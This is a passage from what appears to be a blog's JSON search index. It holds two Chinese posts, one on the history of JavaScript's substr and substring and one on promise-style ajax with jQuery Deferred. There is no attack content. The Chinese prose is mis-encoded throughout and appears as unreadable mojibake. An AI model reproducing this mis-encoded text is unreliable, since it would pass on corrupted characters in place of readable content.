Communicationsä¸Sun Microsystemså…¬å¸åˆä½œï¼Œåœ¨Netscape Navigatorä¸­å¼•å…¥äº†æ›´å¤šçš„é™æ€ç¼–ç¨‹è¯­è¨€Javaï¼Œä»¥ä¾¿ä¸å¾®è½¯ç«äº‰ç”¨æˆ·é‡‡ç”¨WebæŠ€æœ¯å’Œå¹³å°ã€‚ç½‘æ™¯å…¬å¸å†³å®šï¼Œä»–ä»¬æƒ³åˆ›å»ºçš„è„šæœ¬è¯­è¨€å°†è¡¥å……Javaï¼Œå¹¶ä¸”åº”è¯¥æœ‰ä¸€ä¸ªç±»ä¼¼çš„è¯­æ³•ï¼Œæ’é™¤é‡‡ç”¨Perlï¼ŒPythonï¼ŒTCLæˆ–Schemeç­‰å…¶ä»–è¯­è¨€ã€‚ä¸ºäº†æå«å¯¹ç«äº‰æ€§ææ¡ˆçš„JavaScriptçš„æƒ³æ³•ï¼Œå…¬å¸éœ€è¦ä¸€ä¸ªåŸå‹ã€‚ 1995å¹´5æœˆï¼ŒEichåœ¨10å¤©å†…å†™å®Œã€‚\nä¸Šå¸ç”¨ä¸ƒå¤©æ—¶é—´åˆ›é€ ä¸‡ç‰©, Brendan Eichç”¨10å¤©æ—¶é—´åˆ›é€ äº†ä¸€é—¨è¯­è¨€ã€‚æˆ–è®¸ç”¨åˆ›é€ å¹¶ä¸åˆé€‚ï¼Œå› ä¸ºJavaScriptæ˜¯ç«™åœ¨äº†Perlï¼ŒPythonï¼ŒTCLæˆ–Schemeç­‰å…¶ä»–å·¨äººçš„è‚©è†€ä¸Šè€Œäº§ç”Ÿçš„ã€‚\nJavaScriptå¹¶ä¸åƒCé‚£æ ·å‡ºèº«åé—¨ï¼Œåœ¨è´å°”å®éªŒå®¤ç²¾å¿ƒæ‰“é€ ï¼Œä½†æ˜¯JavaScriptåœ¨å¾€åçš„è‡ªç„¶é€‰æ‹©ä¸­ï¼Œå¹¶æ²¡æœ‰å› æ­¤è§æ¡ï¼Œåè€Œå€ŸåŠ©äºC,C++, Java, Perlï¼ŒPythonï¼ŒTCL, Schemeä¼˜ç§€åŸºå› ï¼Œè¿›åŒ–å‡ºæ›´åŠ å¼ºå¤§å¼ºå¤§çš„ç”Ÿå‘½åŠ›ã€‚\nå› æ­¤å¯ä»¥æƒ³è±¡ï¼Œåœ¨10å¤©ä¹‹å†…ï¼Œå½“Brendan Eichå†™åˆ°Stringçš„substrå’Œsubstringæ–¹æ³•æ—¶ï¼Œæˆ–è®¸ä»–å¹¶æ²¡å›°æƒ‘ç€ä¸¤ä¸ªæ–¹æ³•çš„å‚æ•°åº”è¯¥å¦‚ä½•è®¾ç½®ï¼Œå› ä¸ºåœ¨C++å’ŒJavaçš„å®ç°ä¸­ï¼Œå·²ç»æœ‰äº†ç±»ä¼¼çš„å®šä¹‰ã€‚ å¦‚æœä½ äº†è§£å†å²ï¼Œä½ å°±ä¸ä¼šå›°æƒ‘ç°åœ¨ã€‚\n3. æ‰€ä»¥ï¼Œsubstrå’Œsubstringç©¶ç«Ÿæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼šsubstrå’Œsubstringéƒ½æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œä»–ä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„å«ä¹‰æ˜¯ç›¸åŒçš„ï¼Œä¸åŒçš„æ˜¯ç¬¬äºŒä¸ªå‚æ•°ã€‚substrçš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯åˆ°è¾¾ç»“æŸç‚¹çš„è·ç¦»ï¼Œsubstringæ˜¯ç»“æŸçš„ä½ç½®ã€‚\n4. å‚è€ƒæ–‡çŒ® ç»´åŸºç™¾ç§‘ï¼šç¨‹å¼èªè¨€æ­·å² C++ std::string::substr JavaScript å¦‚æœ‰ä¸æ­£ç¡®çš„åœ°æ–¹ï¼Œæ¬¢è¿æŒ‡æ­£ã€‚\n","permalink":"https://wdd.js.org/posts/2018/01/substr-and-substring-history/","summary":"å¼•å­ï¼š å¾ˆå¤šæ—¶å€™ï¼Œå½“æˆ‘è¦å­—ç¬¦ä¸²æˆªå–æ—¶ï¼Œæˆ‘ä¼šæƒ³åˆ°substrå’Œsubstringçš„æ–¹æ³•ï¼Œä½†æ˜¯å…·ä½“è¦æ€ä¹ˆä¼ å‚æ•°æ—¶ï¼Œæˆ‘æ€»æ˜¯è®°ä¸ä½ã€‚å“ªä¸ªåº”è¯¥ä¼ ä¸ªå­—ç¬¦ä¸²é•¿åº¦ï¼Œå“ªä¸ªåˆåº”è¯¥ä¼ ä¸ªå¼€å§‹å’Œç»“å°¾çš„ä¸‹æ ‡ï¼Œå¦‚æœæˆ‘ä¸å»æŸ¥æŸ¥è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæˆ‘å§‹ç»ˆä¸æ•¢å»ä½¿ç”¨å®ƒä»¬ã€‚æ‰€ä»¥æˆ‘æ€»æ˜¯è§‰å¾—ï¼Œè¿™ä¸ªä¸¤ä¸ªæ–¹æ³•åèµ·çš„çœŸæ˜¯è¹©è„šã€‚ç„¶è€Œäº‹å®æ˜¯è¿™æ ·çš„å—ï¼Ÿ\nçœ‹æ¥æ˜¯æ—¶å€™æ‰’ä¸€æ‰’è¿™ä¸¤ä¸ªæ–¹æ³•çš„å†å²äº†ã€‚\n1. åŸºå› è¿½æœ¬æº¯æº åœ¨ç¼–ç¨‹è¯­è¨€çš„å†å²é•¿æ²³ä¸­ï¼Œæ›¾ç»å‡ºç°è¿‡å¾ˆå¤šç¼–ç¨‹è¯­è¨€ã€‚ç„¶è€Œå¤§æµªæ·˜æ²™ï¼Œé“…åæ´—å°½ä¹‹åï¼Œå¾ˆå¤šæ—©å·²æŠ˜æˆŸæ²‰æ²™ï¼Œæœ‰äº›å´ä¾æ—§å…‰å½©å¤ºç›®ã€‚é‚£ä¹ˆstubsträ¸substringçš„DNAç©¶ç«Ÿæ¥è‡ªä½•å¤„ï¼Ÿ\n1950ä¸1960å¹´ä»£\n1954 - FORTRAN 1958 - LISP 1959 - COBOL 1964 - BASIC 1970 - Pascal 1967-1978ï¼šç¡®ç«‹äº†åŸºç¡€èŒƒå¼\n1972 - Cè¯­è¨€ 1975 - Scheme 1978 - SQL (èµ·å…ˆåªæ˜¯ä¸€ç§æŸ¥è¯¢è¯­è¨€ï¼Œæ‰©å……ä¹‹åä¹Ÿå…·å¤‡äº†ç¨‹åºç»“æ„) 1980å¹´ä»£ï¼šå¢å¼ºã€æ¨¡å—ã€æ€§èƒ½\n1983 - C++ (å°±åƒæœ‰ç±»åˆ«çš„C) 1988 - Tcl 1990å¹´ä»£ï¼šäº’è”ç½‘æ—¶ä»£\n1991 - Python 1991 - Visual Basic 1993 - Ruby 1995 - Java 1995 - Delphi (Object Pascal) 1995 - JavaScript 1995 - PHP 2009 - Go 2014 - Swift (ç¼–ç¨‹è¯­è¨€) 1.","title":"è¿½æœ¬æº¯æºï¼šsubsträ¸substringå†å²æ¼«è¯"},{"content":"1. æƒ…æ™¯å†ç° ä»¥å‰ç”¨nodejså†™åç«¯ç¨‹åºæ—¶ï¼Œé‡åˆ°Promiseè¿™ä¸ªæ¦‚å¿µï¼Œè¿™ä¸ªä¸œè¥¿å¥½å‘€ï¼ä¸ç”¨è°¢ä¸€å±‚ä¸€å±‚å›è°ƒï¼Œç›´æ¥ç”¨ç±»ä¼¼äºjQueryçš„è¿ç¼€æ–¹å¼ã€‚åæ¥é‡åˆ°bluebirdè¿™ä¸ªåº“ï¼Œå®ƒå°±æ˜¯Promiseåº“ä¸­å¾ˆæœ‰åçš„ã€‚æˆ‘å¸Œæœ›å¯ä»¥æŠŠPromiseç”¨åœ¨å‰ç«¯çš„ajaxè¯·æ±‚ä¸Šï¼Œä½†æ˜¯æˆ‘ä¸æƒ³åˆå¼•å…¥bluebirdã€‚åæ¥å‘ç°ï¼Œjqueryæœ¬èº«å°±å…·æœ‰ç±»ä¼¼äºPromiseçš„ä¸œè¥¿ã€‚äºæ˜¯æˆ‘å°±jqueryçš„Promiseå†™ä¸€äº›å¼‚æ­¥è¯·æ±‚ã€‚\n2. ä¸å ªå›é¦– çœ‹çœ‹ä¸€çœ‹æˆ‘ä»¥å‰å†™å¼‚æ­¥è¯·æ±‚çš„æ–¹å¼\n// å‡½æ•°å®šä¹‰ function sendRequest(req,successCallback,errorCallback){ $.ajax({ ... ... success:function(res){ successCallback(res); }, error:function(res){ errorCallback(res); } }); } // å‡½æ•°è°ƒç”¨,è¿™ä¸ªå‡½æ•°çš„åŒ¿åå‡½æ•°å†™çš„æ—¶å€™å¾ˆå®¹æ˜“å‡ºé”™ï¼Œè€Œä¸”æœ‰æ—¶å€™éš¾ä»¥ç†è§£ sendRequest(req,function(res){ //è¯·æ±‚æˆåŠŸ ... },function(res){ //è¯·æ±‚å¤±è´¥ ... }); 3. é¢æœå¤§æµ· ä¸‹é¢æ˜¯æˆ‘å¸Œæœ›çš„å¼‚æ­¥è°ƒç”¨æ–¹å¼\nsendRequest(req) .done(function(res){ //è¯·æ±‚æˆåŠŸ ... }) .fail(function(req){ //è¯·æ±‚å¤±è´¥ ... }); 4. åºŸè¯å°‘è¯´ï¼Œæ”¾â€˜ç â€™è¿‡æ¥ talk is cheap, show me the code\n// æœ€åº•å±‚çš„å‘é€å¼‚æ­¥è¯·æ±‚ï¼ŒåšæˆPromiseçš„å½¢å¼ App.addMethod(\u0026#39;_sendRequest\u0026#39;,function(path,method,payload){ var dfd = $.Deferred(); $.ajax({ url:path, type:method || \u0026#34;get\u0026#34;, headers:{ sessionId:session.id || \u0026#39;\u0026#39; }, data:JSON.stringify(payload), dataType:\u0026#34;json\u0026#34;, contentType : \u0026#39;application/json; charset=UTF-8\u0026#39;, success:function(data){ dfd.resolve(data); }, error:function(data){ dfd.reject(data); } }); return dfd.promise(); }); //æ ¹æ®callIdæŸ¥è¯¢å½•éŸ³æ–‡ä»¶ï¼Œä¸ä»…ä»…æ˜¯å¼‚æ­¥è¯·æ±‚å¯ä»¥åšæˆPromiseå½¢å¼ï¼Œä»»ä½•å‡½æ•°éƒ½å¯ä»¥åšæˆPromiseå½¢å¼ App.addMethod(\u0026#39;_getRecordingsByCallId\u0026#39;,function(callId){ var dfd = $.Deferred(), path = \u0026#39;/api/tenantcalls/\u0026#39;+callId+\u0026#39;/recordings\u0026#39;; App._sendRequest(path) .done(function(res){dfd.resolve(res);}) .fail(function(res){dfd.reject(res);}); return dfd.promise(); }); // è·å–å½•éŸ³ App.addMethod(\u0026#39;getCallDetailRecordings\u0026#39;,function(callId){ App._getRecordingsByCallId(callId) .done(function(res){ // è·å–ç»“æœåæ¸²æŸ“æ•°æ® App.renderRecording(res); }) .fail(function(res){ App.error(res); }); }); 5. æ³¨æ„äº‹é¡¹ jQueryçš„Promiseä¸»è¦æ˜¯ç”¨äº†jQqueryçš„$.Derferred()æ–¹æ³•ï¼Œä¸€äº›è€ç‰ˆæœ¬çš„jqueryå¹¶ä¸æ”¯æŒæ­¤æ–¹æ³•ã€‚ jQueryç‰ˆæœ¬å¿…é¡»å¤§äºç­‰äº1.5ï¼Œæ¨èä½¿ç”¨1.11.3 6. å‚è€ƒæ–‡çŒ® jqueryå®˜æ–¹apiæ–‡æ¡£ jqueryç»´åŸºç™¾ç§‘æ–‡æ¡£ 7. æœ€å ä»¥ä¸Šæ–‡ç« ä»…ä¾›å‚è€ƒï¼Œä¸åŒ…å®Œå…¨æ­£ç¡®ã€‚æ¬¢è¿è¯„è®ºï¼Œ3qã€‚\n","permalink":"https://wdd.js.org/posts/2018/01/jquery-deferred/","summary":"1. æƒ…æ™¯å†ç° ä»¥å‰ç”¨nodejså†™åç«¯ç¨‹åºæ—¶ï¼Œé‡åˆ°Promiseè¿™ä¸ªæ¦‚å¿µï¼Œè¿™ä¸ªä¸œè¥¿å¥½å‘€ï¼ä¸ç”¨è°¢ä¸€å±‚ä¸€å±‚å›è°ƒï¼Œç›´æ¥ç”¨ç±»ä¼¼äºjQueryçš„è¿ç¼€æ–¹å¼ã€‚åæ¥é‡åˆ°bluebirdè¿™ä¸ªåº“ï¼Œå®ƒå°±æ˜¯Promiseåº“ä¸­å¾ˆæœ‰åçš„ã€‚æˆ‘å¸Œæœ›å¯ä»¥æŠŠPromiseç”¨åœ¨å‰ç«¯çš„ajaxè¯·æ±‚ä¸Šï¼Œä½†æ˜¯æˆ‘ä¸æƒ³åˆå¼•å…¥bluebirdã€‚åæ¥å‘ç°ï¼Œjqueryæœ¬èº«å°±å…·æœ‰ç±»ä¼¼äºPromiseçš„ä¸œè¥¿ã€‚äºæ˜¯æˆ‘å°±jqueryçš„Promiseå†™ä¸€äº›å¼‚æ­¥è¯·æ±‚ã€‚\n2. ä¸å ªå›é¦– çœ‹çœ‹ä¸€çœ‹æˆ‘ä»¥å‰å†™å¼‚æ­¥è¯·æ±‚çš„æ–¹å¼\n// å‡½æ•°å®šä¹‰ function sendRequest(req,successCallback,errorCallback){ $.ajax({ ... ... success:function(res){ successCallback(res); }, error:function(res){ errorCallback(res); } }); } // å‡½æ•°è°ƒç”¨,è¿™ä¸ªå‡½æ•°çš„åŒ¿åå‡½æ•°å†™çš„æ—¶å€™å¾ˆå®¹æ˜“å‡ºé”™ï¼Œè€Œä¸”æœ‰æ—¶å€™éš¾ä»¥ç†è§£ sendRequest(req,function(res){ //è¯·æ±‚æˆåŠŸ ... },function(res){ //è¯·æ±‚å¤±è´¥ ... }); 3. é¢æœå¤§æµ· ä¸‹é¢æ˜¯æˆ‘å¸Œæœ›çš„å¼‚æ­¥è°ƒç”¨æ–¹å¼\nsendRequest(req) .done(function(res){ //è¯·æ±‚æˆåŠŸ ... }) .fail(function(req){ //è¯·æ±‚å¤±è´¥ ... }); 4. åºŸè¯å°‘è¯´ï¼Œæ”¾â€˜ç â€™è¿‡æ¥ talk is cheap, show me the code\n// æœ€åº•å±‚çš„å‘é€å¼‚æ­¥è¯·æ±‚ï¼ŒåšæˆPromiseçš„å½¢å¼ App.addMethod(\u0026#39;_sendRequest\u0026#39;,function(path,method,payload){ var dfd = $.Deferred(); $.ajax({ url:path, type:method || \u0026#34;get\u0026#34;, headers:{ sessionId:session.id || \u0026#39;\u0026#39; }, data:JSON.stringify(payload), dataType:\u0026#34;json\u0026#34;, contentType : \u0026#39;application/json; charset=UTF-8\u0026#39;, success:function(data){ dfd.","title":"ç†Ÿç»ƒä½¿ç”¨ä½¿ç”¨jQuery Promise (Deferred)"}]